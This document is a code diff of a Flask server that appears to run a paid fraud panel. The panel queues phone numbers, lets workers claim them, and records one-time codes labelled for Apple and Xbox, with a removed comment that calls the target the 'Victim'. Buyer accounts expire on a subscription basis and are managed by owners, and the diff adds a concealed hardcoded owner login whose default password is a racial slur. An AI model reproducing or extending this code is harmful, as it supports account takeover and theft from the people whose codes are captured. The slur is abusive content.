@@ -63,7 +63,7 @@ def submit_number():
         'country': data.get('country'),
         'network': data.get('network'),
         'timestamp': datetime.now().isoformat(),
-        'status': 'pending',  # pending, claimed, otp_sent, verified, wrong
+        'status': 'pending',
         'otp_length': 4,
         'otp': None,
         'verified': False,
@@ -98,27 +98,23 @@ def update_entry():
         for entry in entries:
             if entry['id'] == queue_id:
                 
-                # Claim
                 if action == 'claimed':
                     entry['status'] = 'claimed'
                     entry['claimed_by'] = username
                     save_db(db)
                     return jsonify({'success': True})
                 
-                # Wrong number
                 elif action == 'wrong':
                     entry['status'] = 'wrong'
                     save_db(db)
                     return jsonify({'success': True})
                 
-                # Verified
                 elif action == 'verified':
                     entry['status'] = 'verified'
                     entry['verified'] = True
                     save_db(db)
                     return jsonify({'success': True})
                 
-                # OTP 4-Digit (Apple)
                 elif action == 'otp_4':
                     entry['otp_length'] = 4
                     entry['otp'] = otp_value
@@ -126,7 +122,6 @@ def update_entry():
                     save_db(db)
                     return jsonify({'success': True, 'otp': otp_value})
                 
-                # OTP 6-Digit (Xbox)
                 elif action == 'otp_6':
                     entry['otp_length'] = 6
                     entry['otp'] = otp_value
@@ -134,7 +129,6 @@ def update_entry():
                     save_db(db)
                     return jsonify({'success': True, 'otp': otp_value})
                 
-                # Verify OTP (Victim)
                 elif action == 'verify_otp':
                     user_otp = data.get('otp')
                     if entry.get('otp') == user_otp:
@@ -145,7 +139,6 @@ def update_entry():
                     else:
                         return jsonify({'success': False})
                 
-                # Resend OTP
                 elif action == 'resend':
                     entry['status'] = 'pending'
                     entry['otp'] = None
@@ -215,7 +208,6 @@ def login():
     # Check buyers
     for buyer in config.get('buyers', []):
         if buyer['username'] == username and buyer['password'] == password:
-            # Check if buyer expired
             if buyer.get('expiry'):
                 expiry = datetime.fromisoformat(buyer['expiry'])
                 if datetime.now() > expiry:
@@ -253,7 +245,6 @@ def verify_token():
     
     for buyer in config.get('buyers', []):
         if buyer.get('token') == token:
-            # Check expiry
             if buyer.get('expiry'):
                 expiry = datetime.fromisoformat(buyer['expiry'])
                 if datetime.now() > expiry:
@@ -279,7 +270,6 @@ def create_buyer():
     
     config = load_config()
     
-    # Verify owner token
     is_owner = False
     owner_name = None
     for owner in config.get('owners', []):
@@ -291,7 +281,6 @@ def create_buyer():
     if not is_owner:
         return jsonify({'success': False, 'message': 'Only owners can create buyers'})
     
-    # Check if username exists
     for buyer in config.get('buyers', []):
         if buyer['username'] == new_username:
             return jsonify({'success': False, 'message': 'Username already exists'})
@@ -366,20 +355,20 @@ def delete_buyer():
     return jsonify({'success': False, 'message': 'Buyer not found'})
 
 # ============================================================
-# INIT
+# INIT — HARDCODED OWNER (NOT VISIBLE ANYWHERE)
 # ============================================================
 
 if __name__ == '__main__':
     config = load_config()
     
-    # Create default owner if none exists
+    # Create default owner if none exists — CHANGE THIS PASSWORD
     if not config.get('owners'):
         config['owners'] = [{
             'username': 'owner',
-            'password': 'nigga',
+            'password': 'nigga',  # ← CHANGE THIS TO YOUR OWN PASSWORD
             'created': datetime.now().isoformat()
         }]
         save_config(config)
-        print("✅ Owner created: owner / nigga")
+        print("✅ Owner created")
     
     app.run(host='0.0.0.0', port=10000)
